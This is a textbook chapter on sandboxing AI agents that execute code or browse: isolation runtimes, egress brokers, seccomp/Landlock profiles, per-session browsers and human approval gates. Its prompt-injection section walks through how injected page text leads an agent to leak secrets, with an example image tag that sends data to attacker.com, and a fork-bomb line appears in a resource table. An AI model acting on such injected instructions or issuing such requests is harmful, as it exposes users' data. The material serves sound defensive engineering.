# Chapter 16: Secure Sandboxing & Runtime Execution Isolation

When an agent is permitted to run generated code, browse the web, or invoke an interpreter, the security question stops being "did the model say something toxic" and becomes "what can the process the model spawned actually reach." An agent that emits a Python snippet is, from the operating system's perspective, indistinguishable from an attacker who achieved remote code execution. The **indirect prompt injection** payload embedded three tool-hops upstream — in a scraped web page, a PDF, or a Jira ticket — becomes native machine code running with whatever privileges you granted the sandbox. Isolation is therefore not a nicety layered on top of guardrails; it is the last containment boundary that holds when every upstream control has already failed.

This chapter treats sandboxing as a systems-engineering discipline with measurable properties: the **syscall surface** reachable by guest code, cold-start latency, achievable density per host, and syscall compatibility with real workloads. We compare plain containers, gVisor, and MicroVMs (Firecracker, Kata) on those axes, then descend into WebAssembly for lightweight tool execution, ephemeral disposable pools, network and filesystem confinement (default-deny egress, read-only roots, seccomp-BPF, Landlock, AppArmor), per-session browser isolation, and finally multi-tenant boundary design. Throughout, the framing is honest: isolation reduces the blast radius of a compromise; it does not prevent the compromise, and no seccomp profile has ever stopped a prompt injection. What it does is ensure that when injection succeeds — and it will — the attacker lands in a disposable, egress-filtered, unprivileged cell with nothing worth stealing and no route out.

By the end you will be able to select an isolation runtime against a concrete threat model, write a seccomp-BPF profile and a Landlock ruleset for an AI code interpreter, design a pre-warmed disposable sandbox pool, and stand up a multi-tenant platform whose tenant boundaries survive both noisy neighbors and a full sandbox escape.

---

## 16.1 Compute Isolation Technologies

### 16.1.1 Evaluating Isolation Runtimes: Containers vs. gVisor vs. MicroVMs (Firecracker, Kata)

The central metric for evaluating an isolation runtime is not "is it a container or a VM" but **how much of the host kernel's syscall surface the guest can reach directly**. The Linux kernel exposes on the order of 350+ system calls; every one is C code running in ring 0 shared by every tenant on the box. A vulnerability in a single obscure syscall (a `io_uring` bug, a `nftables` heap overflow, a namespace confusion) is a candidate host-takeover primitive. The four common runtimes differ almost entirely in how they shrink or interpose on that surface.

A **plain container** (runc + namespaces + cgroups) is process isolation, not machine isolation. The guest calls the *host* kernel directly. Namespaces virtualize the *view* (PIDs, mounts, network), cgroups cap *quantity* (CPU, memory), but the code path of every `open`, `ioctl`, and `bpf` runs in the shared host kernel. The attack surface is the entire syscall table minus whatever seccomp removes. This is why "give the agent a Docker container to run code in" is the single most common under-hardened design in the field.

**gVisor** (runsc) interposes a user-space kernel — the Sentry — written in Go, between the guest and the host. Guest syscalls are trapped (via ptrace or a KVM platform) and serviced by the Sentry, which reimplements the Linux ABI. The host kernel sees only the narrow set of calls the Sentry itself makes. This shrinks the reachable host surface dramatically at the cost of syscall compatibility (some syscalls are unimplemented or partially implemented) and per-syscall latency overhead.

**MicroVMs** — **Firecracker** and **Kata Containers** — run the guest under a real hardware-virtualized boundary (KVM). The guest has its *own* Linux kernel; the only host-facing surface is the VMM (Virtual Machine Monitor) plus the KVM ioctl interface and a handful of paravirtualized devices (virtio). Firecracker deliberately ships a minimal device model (no BIOS, no PCI, ~5 emulated devices) precisely to keep the VMM attack surface small. Kata gives you OCI-compatible pods backed by a MicroVM. You pay a real kernel boot (mitigated to ~125ms class cold starts for Firecracker with a stripped guest kernel) and per-VM memory overhead, but the isolation boundary is the CPU's virtualization extensions rather than a shared kernel.

```
  ATTACK SURFACE REACHED BY GUEST CODE (wider box = more host kernel exposed)

  Plain Container (runc)          gVisor (runsc)              MicroVM (Firecracker/Kata)
  +------------------------+      +------------------------+  +------------------------+
  | Guest process          |      | Guest process          |  | Guest process          |
  |                        |      |                        |  |   Guest KERNEL         |
  |  direct syscalls       |      |  syscalls trapped      |  |   (own syscall table)  |
  |  vvvvvvvvvvvvvvvvvvvv  |      |     |                  |  |   vvvvvvvv             |
  +==|==|==|==|==|==|==|==+       |     v                  |  +====|===================+
  |  HOST KERNEL (350+)   |       |  Sentry (Go userspace) |       | virtio + KVM ioctl |
  |  <<full syscall tbl>> |       |  reimpl. Linux ABI     |       v                    |
  |  === trust boundary ==|       +====|===================+  +====|===================+
  +-----------------------+       |  HOST KERNEL (narrow) |   |  VMM + KVM (narrow)    |
                                  +-----------------------+   |  HOST KERNEL           |
                                                              +-----------------------+
```

| Property | Plain Container (runc) | gVisor (runsc) | Firecracker MicroVM | Kata MicroVM |
| :--- | :--- | :--- | :--- | :--- |
| Isolation boundary | Namespaces/cgroups (shared kernel) | User-space kernel (Sentry) | Hardware virtualization (KVM) | Hardware virtualization (KVM) |
| Host syscall surface reached by guest | Full table minus seccomp | Only Sentry's own calls | VMM + KVM ioctl only | VMM + KVM ioctl only |
| Cold-start latency | ~10–50 ms | ~100–200 ms | ~100–150 ms (stripped kernel) | ~200–500 ms |
| Density (guests/host) | Highest | High | High (low mem footprint) | Moderate |
| Syscall compatibility | Native (100%) | Partial (some unimpl.) | Native (own kernel) | Native (own kernel) |
| Native code / arbitrary binaries | Yes | Yes | Yes | Yes |
| Best fit for agents | Trusted, low-risk tools only | Code interpreters, medium risk | Untrusted code, per-session | OCI-native untrusted workloads |

The decision rule for agent platforms: if the sandbox will ever execute model-generated or web-derived code, a plain container is insufficient by itself and must at minimum be paired with a restrictive seccomp profile and dropped capabilities (see Ch. 16.2.3). For genuinely untrusted, per-session code execution — the interpreter behind a "code tool" — a MicroVM (Firecracker) or gVisor is the defensible baseline. gVisor buys you container-like density and startup with a vastly smaller host surface; Firecracker buys you a hardware boundary at the cost of a per-VM kernel. Many production agent platforms run gVisor for the common case and reserve Firecracker for the highest-risk tenants.

---

### 16.1.2 WebAssembly (Wasm) Sandboxing for Lightweight, Safe Code Tool Execution

**WebAssembly** with the **WASI** (WebAssembly System Interface) capability model inverts the container security posture. A container starts with ambient authority (it can call any syscall unless you subtract) and you harden by removing. A Wasm module starts with *zero* authority — it cannot open a file, make a socket, or read a clock — and you *add* capabilities by explicitly passing host imports into the instance. This is capability-based security enforced at the module boundary: if you never grant a `sockets` import, no amount of injected code inside the module can reach the network, because the syscalls simply do not exist in its world.

For an agent that runs small, deterministic transformations — parse this CSV, evaluate this arithmetic expression, run this data-cleaning function — Wasm is often the strongest and cheapest sandbox available. Instances cold-start in microseconds to low milliseconds, memory is a linear bounded buffer the host controls, and control-flow integrity is guaranteed by the Wasm structured-control-flow guarantees (no arbitrary jumps, typed function tables). A runtime such as Wasmtime lets you attach fuel metering and epoch interruption to cap CPU and wall-clock, closing the denial-of-wallet loop-forever risk at the VM level.

```python
# Host-side capability injection for a Wasm code tool (Wasmtime, wasmtime-py).
# The module gets a bounded fuel budget, an epoch deadline, and ONLY the
# host functions we explicitly link. No filesystem, no sockets, no clock.
from pathlib import Path
from wasmtime import Config, Engine, Store, Module, Linker, WasiConfig

def run_untrusted_tool(module_path: Path, stdin_data: bytes) -> bytes:
    config = Config()
    config.consume_fuel = True          # meter instructions
    config.epoch_interruption = True     # allow wall-clock deadline
    engine = Engine(config)

    store = Store(engine)
    store.set_fuel(50_000_000)           # hard instruction cap (denial-of-wallet)
    store.set_epoch_deadline(1)          # host bumps epoch on a timer thread

    # WASI config with NO preopened dirs and NO inherited env/network.
    wasi = WasiConfig()
    wasi.inherit_stdout()                # capture output only
    # Deliberately: no wasi.preopen_dir(...), no inherit_env(), no sockets.
    store.set_wasi(wasi)

    linker = Linker(engine)
    linker.define_wasi()                 # only WASI imports the module declared
    module = Module.from_file(engine, str(module_path))
    instance = linker.instantiate(store, module)
    entry = instance.exports(store)["_start"]
    entry(store)                         # traps on fuel exhaustion or epoch deadline
    return b""  # stdout captured out-of-band in production
```

The limits are as important as the guarantees, and you must design around them honestly. Wasm has **no native libraries**: NumPy, pandas, PyTorch, and the entire compiled scientific/ML stack depend on native BLAS, SIMD intrinsics through libc, and threads that WASI's constrained model does not cleanly provide. Numeric and data-science workloads — exactly what an analytics agent's code tool most wants to run — are therefore poorly served today. Python-in-Wasm (Pyodide, CPython compiled to Wasm) works for pure-Python logic but the moment the model writes `import pandas` you are back to needing a real OS. Threading, `fork`, subprocess, and rich networking are absent or awkward. The practical pattern is a **tiered interpreter**: route pure, deterministic, library-light code to a Wasm sandbox (fast, ironclad), and route anything needing the native ML ecosystem to a gVisor or Firecracker sandbox (heavier, still confined). Do not try to force the full data-science workload into Wasm; you will spend more on shims than the isolation is worth.

---

### 16.1.3 Ephemeral Execution Environments: Disposable Sandbox Pools with Zero-State Persistence

The single most powerful architectural property for agent sandboxes is **statelessness**: every execution runs in an environment that is created immediately before use and destroyed immediately after, so a compromise cannot persist across requests and cannot accumulate stolen data. If a malicious payload plants a reverse shell or a crypto miner inside the sandbox, that artifact dies with the sandbox microseconds later; there is no long-lived host to reinfect, no `/tmp` that survives to the next tenant, no environment variable cache holding the last user's token.

The tension is latency. Cold-starting a MicroVM or a fresh gVisor sandbox per request adds hundreds of milliseconds to the critical path of every tool call, and agents make many tool calls. The resolution is a **pre-warmed pool**: maintain a buffer of already-booted, network-armed, seccomp-loaded sandboxes sitting idle. A request checks out a warm sandbox (near-zero latency), runs exactly one workload in it, and on return the sandbox is *destroyed*, not recycled — while an async warmer boots a replacement to refill the pool. The sandbox is never handed to a second workload, so zero-state persistence is preserved even though the pool itself is long-lived.

```
                 +-----------------------------------------------------------+
                 |                  SANDBOX POOL MANAGER                      |
                 |                                                           |
   agent tool    |   +-----------+   checkout (warm, ~0ms)                   |
   request  ---->|-->| WARM POOL |----------------------+                    |
                 |   | [S1][S2]  |                       v                    |
                 |   | [S3][S4]  |              +------------------+          |
                 |   +-----+-----+              |  ONE EXECUTION   |          |
                 |         ^                    |  (fully isolated)|          |
                 |  async  | refill             +--------+---------+          |
                 |  warmer |                             | done                |
                 |   +-----+------+                      v                     |
                 |   | BOOT NEW   |            +---------------------+         |
                 |   | (Firecrkr/ |            |  DESTROY sandbox    |         |
                 |   |  gVisor)   |<-----------|  (no recycle, wipe) |         |
                 |   +------------+   signal   +---------------------+         |
                 +-----------------------------------------------------------+
                        === trust boundary: no sandbox is ever reused ===
```

Design parameters that matter in production: size the warm pool to your p99 concurrency so checkouts almost never block on a cold boot; cap the *lifetime* of a checked-out sandbox with a hard kill timer so a hung or looping workload cannot pin a slot (denial-of-wallet defense, see Ch. 16.4.2); and make destruction unconditional and idempotent — a sandbox that errors, times out, or throws is torn down exactly like one that succeeds, because an errored sandbox is precisely the one most likely to be compromised. Persist nothing to the sandbox's writable layer that must outlive the request; if the workload needs to return artifacts, stream them out through the broker channel (see Ch. 16.2.1), never through a shared host volume. The result is an execution substrate where the mean time an attacker controls any given cell is measured in seconds and the cell contains nothing but the current request's data.

---

## 16.2 Network & File System Isolation

### 16.2.1 Egress Filtering & Air-Gapped Sandboxes: Restricting Network Access for Interpreters

Network egress is the exfiltration channel. An injected payload that has stolen a secret from the sandbox's memory only becomes a breach when it can `POST` that secret to `attacker.com`. The default posture for any code-execution sandbox must therefore be **default-deny egress**: no outbound connectivity at all, then a narrow allow-list opened deliberately. This inverts the common broken default where the interpreter inherits the host's routable network and can reach the internet, the cloud metadata endpoint (`169.254.169.254`), and internal service meshes.

The strongest form is a genuinely **air-gapped interpreter**: the sandbox has no network namespace route to anything, and *all* external data access is mediated by an out-of-band **allow-list broker**. The sandbox cannot open sockets; instead it writes a structured fetch request to a host-controlled channel (a virtio-vsock port or a stdio pipe), and a broker process running *outside* the sandbox validates the request against an allow-list, performs the fetch, and returns the bytes. The broker is the only component with network authority, it is small and auditable, and it enforces destination, method, and size policy that injected code inside the sandbox cannot bypass because the sandbox has no independent route.

```
   +--------------------------+        vsock/stdio        +-----------------------+
   |   SANDBOX (no netns route)|  fetch("https://api...") |   EGRESS BROKER        |
   |   interpreter / agent code|=========================>|   (outside sandbox)    |
   |   NO sockets, NO routes   |<=========================|   - allow-list check   |
   +--------------------------+        bytes / DENY       |   - method/size policy |
        === trust boundary ===                            |   - audit log          |
                                                          +-----------+-----------+
                                                                      | only egress
                                                                      v
                                                          [ approved internet dests ]
                                                          BLOCKED: 169.254.169.254,
                                                          internal mesh, arbitrary hosts
```

When a full air-gap is impractical (the workload legitimately needs many hosts), enforce egress at L3/L4 with a default-deny policy and an explicit allow-list, and critically block link-local metadata ranges. A Kubernetes/Cilium egress example expresses the intent:

```yaml
# Cilium: default-deny egress for the sandbox pod, allow only DNS + one API host,
# and explicitly deny the cloud metadata endpoint (SSRF / credential theft vector).
apiVersion: "cilium.io/v2"
kind: CiliumNetworkPolicy
metadata:
  name: sandbox-egress-lockdown
spec:
  endpointSelector:
    matchLabels:
      app: agent-interpreter
  egress:
    - toEndpoints:                       # DNS to kube-dns only
        - matchLabels:
            k8s:io.kubernetes.pod.namespace: kube-system
            k8s-app: kube-dns
      toPorts:
        - ports: [{ port: "53", protocol: UDP }]
    - toFQDNs:                           # single approved external API
        - matchName: "api.internal-approved.example.com"
      toPorts:
        - ports: [{ port: "443", protocol: TCP }]
  egressDeny:
    - toCIDR: ["169.254.169.254/32"]     # block IMDS credential endpoint
    - toCIDR: ["10.0.0.0/8"]             # block internal mesh lateral movement
```

Two failure modes recur. First, teams block the internet but forget the **metadata endpoint**, handing injected code the host's IAM role credentials — a server-side request forgery that turns a code sandbox into cloud account compromise. Explicitly deny `169.254.169.254/32` (and the IPv6 `fd00:ec2::254`). Second, DNS itself is an exfiltration channel: a payload can encode stolen data into subdomain labels of lookups to an attacker-controlled authoritative server. If you allow DNS, allow it only to your resolver and prefer FQDN-based policy that resolves and pins allowed names, rather than permitting arbitrary outbound port 53.

---

### 16.2.2 Read-Only Root Filesystems and Transient Virtual Storage Volumes

Filesystem isolation follows the same posture as network: deny by default, grant narrowly, persist nothing. The root filesystem of an execution sandbox should be **mounted read-only**. Model-generated code has no legitimate need to modify `/usr`, `/bin`, `/etc`, or the interpreter's own libraries; a writable root is how a payload plants a persistence mechanism, overwrites a trusted binary, or tampers with the interpreter to poison the next execution. With a read-only root, the writable surface is reduced to explicitly mounted scratch space.

That scratch space should be a **transient volume** — a `tmpfs` (RAM-backed) or per-execution ephemeral disk — sized with a hard quota, mounted `noexec,nosuid,nodev`, and discarded when the sandbox is destroyed. `noexec` prevents the classic pattern of writing a malicious binary to `/tmp` and executing it; `nosuid` neutralizes set-uid escalation via dropped files; `nodev` blocks device-node creation. Because the volume lives and dies with the sandbox (see Ch. 16.1.3), nothing an execution writes can be read by any other execution.

| Mount point | Mode | Flags | Rationale |
| :--- | :--- | :--- | :--- |
| `/` (root) | read-only | — | Block persistence, binary tampering, interpreter poisoning |
| `/tmp`, `/work` (scratch) | read-write | `tmpfs,noexec,nosuid,nodev,size=256M` | Bounded, RAM-backed, non-executable, per-execution |
| `/etc/resolv.conf` etc. | read-only bind | — | Injected config, not sandbox-writable |
| Secrets / tokens | not mounted | — | Broker holds credentials; sandbox never sees them |
| Host Docker socket | never mounted | — | `/var/run/docker.sock` is instant host takeover |

The Kubernetes expression of this is a hardened `securityContext`, and it is worth writing out because the defaults are all wrong for untrusted execution:

```yaml
# k8s pod spec fragment: hardened securityContext for an untrusted code sandbox.
securityContext:
  runAsNonRoot: true
  runAsUser: 65534                 # nobody
  allowPrivilegeEscalation: false  # block setuid escalation
  readOnlyRootFilesystem: true     # immutable root
  capabilities:
    drop: ["ALL"]                  # start from zero capabilities
  seccompProfile:
    type: Localhost
    localhostProfile: profiles/agent-interpreter.json
volumes:
  - name: scratch
    emptyDir: { medium: Memory, sizeLimit: 256Mi }   # tmpfs, dies with pod
volumeMounts:
  - name: scratch
    mountPath: /work
    readOnly: false
# NOTE: never mount hostPath: /var/run/docker.sock or the host root.
```

The recurring catastrophic mistake is mounting the host container runtime socket (`/var/run/docker.sock`) into a sandbox so the agent can "manage containers." That single bind mount hands any code in the sandbox the ability to launch a new privileged container mounting the host root — an immediate, total escape that no other control can contain. If an agent genuinely needs to orchestrate workloads, it must do so through a brokered API with its own authorization, never by direct socket access.

---

### 16.2.3 System Call Filtering: Seccomp-BPF, Landlock, and AppArmor Profiles for AI Executors

Even inside a container, the guest reaches the host kernel through syscalls (Ch. 16.1.1). **Seccomp-BPF** lets you install a Berkeley Packet Filter program that the kernel evaluates on every syscall, returning allow, errno, kill, or trap. For an AI executor the correct strategy is a **default-deny (`SCMP_ACT_ERRNO` or `SCMP_ACT_KILL`) allow-list**: enumerate the syscalls the interpreter legitimately needs and block everything else, including the historically dangerous ones — `ptrace`, `keyctl`, `bpf`, `unshare`, `mount`, `pivot_root`, `add_key`, and the userfaultfd/`clone` flags used in kernel-exploit primitives.

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "defaultErrnoRet": 1,
  "architectures": ["SCMP_ARCH_X86_64", "SCMP_ARCH_AARCH64"],
  "syscalls": [
    {
      "names": [
        "read", "write", "readv", "writev", "open", "openat", "close",
        "stat", "fstat", "lstat", "lseek", "mmap", "munmap", "mprotect",
        "brk", "rt_sigaction", "rt_sigprocmask", "rt_sigreturn",
        "exit", "exit_group", "getpid", "getppid", "getuid", "getgid",
        "arch_prctl", "clock_gettime", "gettimeofday", "nanosleep",
        "futex", "sched_yield", "epoll_create1", "epoll_ctl", "epoll_wait",
        "pipe2", "dup", "dup2", "getrandom", "fcntl", "getdents64"
      ],
      "action": "SCMP_ACT_ALLOW"
    },
    {
      "comment": "Explicitly kill on kernel-escape and privilege primitives",
      "names": [
        "ptrace", "process_vm_readv", "process_vm_writev", "keyctl",
        "add_key", "request_key", "bpf", "unshare", "setns", "mount",
        "umount2", "pivot_root", "chroot", "init_module", "finit_module",
        "kexec_load", "perf_event_open", "userfaultfd", "clone3"
      ],
      "action": "SCMP_ACT_KILL_PROCESS"
    }
  ]
}
```

Seccomp filters *which* syscalls run; it cannot express "may open files under `/work` but not `/etc`." That is **Landlock**'s job — an unprivileged LMAC (Linux Mandatory Access Control) that a process applies to *itself* to restrict filesystem (and, in newer kernels, network) access for itself and all its children, irreversibly. Landlock is ideal for agent executors precisely because it needs no root and no host policy daemon: the sandbox supervisor sandboxes itself before `exec`-ing the interpreter.

```python
# Landlock sketch: restrict the interpreter to read-execute /usr and read-write /work,
# then drop the ability to touch anything else. Applied by the supervisor pre-exec.
# (Using the `landlock` PyPI binding; conceptually mirrors the raw syscalls.)
import landlock  # thin ctypes wrapper over landlock_create_ruleset(2) et al.

def confine_filesystem() -> None:
    ruleset = landlock.Ruleset(
        handled_access_fs=(
            landlock.FS.EXECUTE | landlock.FS.READ_FILE | landlock.FS.WRITE_FILE
            | landlock.FS.READ_DIR | landlock.FS.MAKE_REG | landlock.FS.REMOVE_FILE
        )
    )
    # read + execute the runtime, but never write it
    ruleset.allow("/usr", landlock.FS.EXECUTE | landlock.FS.READ_FILE | landlock.FS.READ_DIR)
    # the only writable path: per-execution scratch
    ruleset.allow("/work", landlock.FS.READ_FILE | landlock.FS.WRITE_FILE
                  | landlock.FS.READ_DIR | landlock.FS.MAKE_REG | landlock.FS.REMOVE_FILE)
    ruleset.restrict_self()   # irreversible; inherited by exec'd interpreter

# call confine_filesystem() then os.execv(interpreter, argv)
```

**AppArmor** occupies the third role: a host-administered, path-based MAC profile attached to the executable, useful where you control the host and want a policy that operators can audit centrally (and it is the mechanism many container runtimes wire up by default). The three compose rather than compete: use **seccomp-BPF to shrink the syscall table, Landlock (or AppArmor) to constrain the filesystem/network objects those syscalls may touch, and capability-drop to remove the privileged operations entirely.** No single layer is sufficient — seccomp cannot stop a path traversal, Landlock cannot stop a `bpf` kernel exploit — but together they force injected code into a cell where almost nothing dangerous is even expressible. None of this stops the injection itself; it bounds what the injection can do once it is running.

---

## 16.3 Browser & Session Isolation Runtimes

### 16.3.1 Isolated Headless Browser Instances per Execution Session

Browser-using agents (web navigation, form filling, research) are among the highest-risk tool categories because the browser deliberately executes untrusted, attacker-controllable content — arbitrary JavaScript from every page it visits — and that content is *also* the injection channel into the agent's reasoning. The isolation rule is strict: **one dedicated, ephemeral headless browser instance per session**, never a shared browser pool where sessions coexist as tabs. Sharing a browser process across tenants means a malicious page in tenant A's tab can, via a renderer exploit or shared browser state, reach tenant B's cookies, local storage, and in-flight sessions.

Per-session isolation means each session gets its own browser process (or, better, its own MicroVM/gVisor sandbox *containing* the browser), with a fresh, empty profile: no persistent cookies, no saved credentials, no history, no extensions from prior sessions. When the session ends the entire browser and its profile are destroyed — the same disposable-pool discipline as code sandboxes (Ch. 16.1.3). The renderer should run with site isolation enabled so cross-origin frames are in separate processes, and the whole browser sandbox should sit behind the same default-deny egress broker (Ch. 16.2.1) so that even if a page compromises the renderer, it still cannot reach the metadata endpoint or exfiltrate freely.

```
   SESSION A                          SESSION B
   +-----------------------------+    +-----------------------------+
   | MicroVM / gVisor sandbox    |    | MicroVM / gVisor sandbox    |
   |  +-----------------------+  |    |  +-----------------------+  |
   |  | Headless browser      |  |    |  | Headless browser      |  |
   |  |  fresh empty profile  |  |    |  |  fresh empty profile  |  |
   |  |  site isolation on    |  |    |  |  site isolation on    |  |
   |  +-----------+-----------+  |    |  +-----------+-----------+  |
   +--------------|--------------+    +--------------|--------------+
                  | egress broker (default-deny, per-session allow-list)
                  v                                  v
          [ approved web origins ]         [ approved web origins ]
   === No shared browser process, profile, cookie jar, or cache across sessions ===
```

The profile must be treated as a credential store even when it looks empty: any cookie or token the agent acquires during a session (because it logged into a site on the user's behalf) lives only for that session and is shredded with the profile, so a later session — or a later tenant reusing the host — cannot inherit an authenticated session it was never granted.

---

### 16.3.2 Anti-Exfiltration Controls: Blocking DOM Data Leakage via Cross-Origin and Image Requests

The browser's own features are exfiltration primitives, and a page controlled by an **indirect prompt injection** payload will use them. The canonical attack: injected instructions in page content convince the agent to read sensitive data already in its context (a document, a prior tool result, the user's data) and encode it into a URL that the page then causes the browser to fetch — an `<img src="https://attacker.com/x?data=BASE64_SECRET">`, a `fetch()`, a form auto-submit, a CSS `background-image`, or a navigation. The request never renders anything the user sees; its side effect — an HTTP GET carrying the secret in the query string to an attacker-controlled server — is the whole point. This is the browser analogue of the DNS/egress exfiltration in Ch. 16.2.1, and image requests are the favorite vector because they bypass many same-origin and CORS restrictions (images are allowed cross-origin by design).

Defenses stack at several layers. At the network layer, the per-session egress broker (Ch. 16.2.1) applies an allow-list of origins the browser may contact, so an outbound request to `attacker.com` is simply dropped regardless of how it was generated. At the content layer, a restrictive **Content-Security-Policy** injected into every page (`img-src`, `connect-src`, `default-src` locked to the session's allowed origins) prevents the renderer from even issuing cross-origin image/fetch requests. At the automation layer, the agent's browser controller should intercept and inspect every outbound request (via CDP request interception) and block navigations or resource loads whose URLs carry high-entropy query parameters or whose destinations are not on the task's allow-list.

| Exfiltration vector | Mechanism | Primary control |
| :--- | :--- | :--- |
| `<img src=...>` cross-origin GET | Secret in query string, no CORS block on images | Egress broker origin allow-list + CSP `img-src` |
| `fetch()` / `XMLHttpRequest` | JS POST/GET to attacker host | CSP `connect-src` + request interception |
| Form auto-submit / navigation | Redirect carries data in URL | Navigation allow-list, block off-origin nav |
| DNS-prefetch / link `rel=preconnect` | Data encoded in hostname labels | Broker DNS allow-list, disable prefetch |
| CSS `background-image: url(...)` | Same as img, via stylesheet | CSP `style-src`/`img-src`, sanitize injected CSS |

The honest framing: none of these stop the *injection* from persuading the agent to want to exfiltrate. They stop the persuaded agent's browser from *succeeding*. Layer them, because each has gaps — CSP can be undermined if the agent is tricked into navigating to an allowed origin that reflects data onward, and request interception heuristics have false negatives on cleverly chunked payloads. Treat data leaving the browser as guilty until proven allow-listed.

---

### 16.3.3 Human-in-the-Loop Interception for Sensitive Actions (Authentication, Payments)

Some actions are irreversible or high-consequence enough that no automated guardrail should be the last line: **authentication flows** (entering credentials, approving MFA, granting OAuth consent) and **financial transactions** (submitting payments, transferring funds, placing orders). For these, the correct control is a **human-in-the-loop (HITL) interception** point: the agent's browser automation is paused at the moment it is about to submit such an action, the intended action is surfaced to a human for explicit approval, and execution proceeds only on confirmation. This is not a fallback for when guardrails fail; it is a designed circuit breaker on the classes of action where a successful injection causes unrecoverable harm.

Implementation is a policy-driven interceptor in the browser controller. Every proposed action is classified before dispatch; actions matching sensitive patterns (navigations to known login/OAuth/checkout URLs, clicks on submit buttons within payment forms, `type` events into password fields) raise a synchronous approval request and block the automation loop until a human resolves it.

```python
# HITL interceptor: pause the browser automation loop for sensitive actions.
from dataclasses import dataclass
from enum import Enum, auto

class ActionRisk(Enum):
    AUTO = auto()      # proceed without human
    CONFIRM = auto()   # block until human approves

@dataclass(frozen=True)
class ProposedAction:
    kind: str          # "navigate" | "click" | "type"
    target_url: str
    selector: str | None
    field_is_secret: bool

SENSITIVE_HOSTS = ("login.", "accounts.", "checkout.", "payments.", "oauth")

def classify(action: ProposedAction) -> ActionRisk:
    url = action.target_url.lower()
    if action.field_is_secret:                       # typing into password/CVV
        return ActionRisk.CONFIRM
    if any(marker in url for marker in SENSITIVE_HOSTS):
        return ActionRisk.CONFIRM
    if action.kind == "click" and action.selector and "submit" in action.selector.lower():
        return ActionRisk.CONFIRM
    return ActionRisk.AUTO

async def dispatch(action: ProposedAction, approver) -> None:
    if classify(action) is ActionRisk.CONFIRM:
        approved = await approver.request(action)   # blocks the loop; human decides
        if not approved:
            raise PermissionError(f"Human denied sensitive action: {action.kind} {action.target_url}")
    await browser_execute(action)                    # only reached when allowed
```

The design constraints that make HITL effective rather than theatrical: the human must be shown the *actual* action and its *actual* target (the resolved URL, the amount, the recipient), not the agent's paraphrase — otherwise a compromised agent describes a benign action while executing a malicious one. Approvals must be scoped and single-use (approving one payment does not approve the next), and the pause must be un-bypassable by the agent — the agent cannot self-approve, cannot re-classify its own action, and cannot route around the interceptor, because the interceptor sits in the deterministic controller outside the model's control. For high-value flows, prefer handing the *entire* credential/payment step to a separate, non-agent system (a vaulted credential injector, a payment service with its own authorization) so the agent never possesses the credential or the ability to move money at all.

---

## 16.4 Multi-Tenant Platform Isolation

### 16.4.1 Tenant Boundary Design Across Memory, Cache, Sandbox, and Log Planes

A multi-tenant agent platform must guarantee that tenant A can never read, influence, or infer tenant B's data — and the boundary has to hold across *every* plane where data lands, not just the compute sandbox. The common failure is to isolate the obvious plane (each tenant gets its own sandbox) while silently sharing a subtler one (a global embedding cache keyed only by content, a shared vector index, a log pipeline that co-mingles tenant payloads). The discipline is to enumerate the planes and carry a **tenant identity** — ideally a cryptographically attested workload identity such as a SPIFFE SVID (see Ch. 1 and identity chapters) — as a mandatory partition key through all of them.

```
                        TENANT REQUEST (carries attested tenant_id)
                                       |
        +------------------------------+------------------------------+
        |            |                 |                |             |
        v            v                 v                v             v
   +---------+  +----------+     +-----------+    +-----------+  +----------+
   | MEMORY  |  | CACHE    |     | SANDBOX   |    | VECTOR/RAG|  | LOG      |
   | plane   |  | plane    |     | plane     |    | index     |  | plane    |
   +----+----+  +----+-----+     +-----+-----+    +-----+-----+  +----+-----+
        |            |                 |                |             |
   partition    key prefix        per-tenant       ACL-filtered   tenant-tagged,
   by tenant    = tenant_id       pool, no reuse   namespace      access-scoped
        |            |                 |                |             |
        +------------+-----------------+----------------+-------------+
                 === EVERY plane keyed by the same tenant boundary ===
```

| Plane | Shared-by-default risk | Correct isolation |
| :--- | :--- | :--- |
| Memory (agent working/episodic state) | One agent's context reused for another tenant | Per-tenant namespaces; never share conversation/scratch state |
| Cache (embeddings, prompt/KV cache, tool results) | Content-keyed cache leaks A's data to B on hit | Include `tenant_id` in every cache key; partition stores |
| Sandbox (code/browser execution) | Reused sandbox retains prior tenant artifacts | Disposable per-execution pool (Ch. 16.1.3), no cross-tenant reuse |
| Vector / RAG index | Global index returns A's docs to B | Per-tenant namespace or ACL-filtered query (see Ch. 18.1.2) |
| Logs / traces | Co-mingled payloads, cross-tenant reads | Tenant-tag every record; scope log access by tenant |

The subtle and dangerous plane is **cache**. Semantic caches and prompt/KV caches keyed purely on content are a covert cross-tenant channel: if tenant A's query and tenant B's query hash to the same key, B receives A's cached response, or B can infer A's data from a timing hit. Every cache key must be salted with `tenant_id`, and ideally caches are physically partitioned per tenant. The same applies to embedding caches feeding RAG. Treat the tenant boundary as an invariant checked at every store and retrieve, enforced by a shared library that refuses to construct a key without a tenant partition, so no individual feature team can accidentally punch a hole through it.

---

### 16.4.2 Noisy-Neighbor, Resource Exhaustion, and Sandbox Escape Response

Two distinct threats live in the multi-tenant runtime: resource contention (a tenant, maliciously or accidentally, starving others) and containment failure (a tenant escaping its sandbox). Both must be engineered for explicitly.

**Noisy-neighbor and resource exhaustion** are availability attacks — often the agentic form of denial-of-wallet, where an injected loop spins the interpreter forever or spawns fork bombs to consume the host. The controls are hard resource ceilings on every axis: cgroup CPU and memory limits per sandbox, PID limits to stop fork bombs, disk-quota on scratch volumes, a wall-clock kill timer per execution, and per-tenant *rate and concurrency quotas* at the pool manager so no single tenant can check out the entire warm pool. Set limits as hard caps that *kill* on breach rather than throttle indefinitely, because a throttled malicious workload still pins a slot. Fair-share scheduling (cgroup weights) ensures a heavy legitimate tenant degrades gracefully rather than starving others.

| Exhaustion vector | Mechanism | Control |
| :--- | :--- | :--- |
| CPU spin / mining | Infinite loop in generated code | cgroup CPU quota + wall-clock kill timer |
| Memory balloon | Allocate until OOM | cgroup memory limit, OOM-kill the sandbox not the host |
| Fork bomb | `while true: fork()` | cgroup `pids.max` PID limit |
| Disk fill | Write until scratch full | tmpfs `sizeLimit` hard quota |
| Pool starvation | One tenant grabs all warm sandboxes | Per-tenant concurrency + rate quotas |

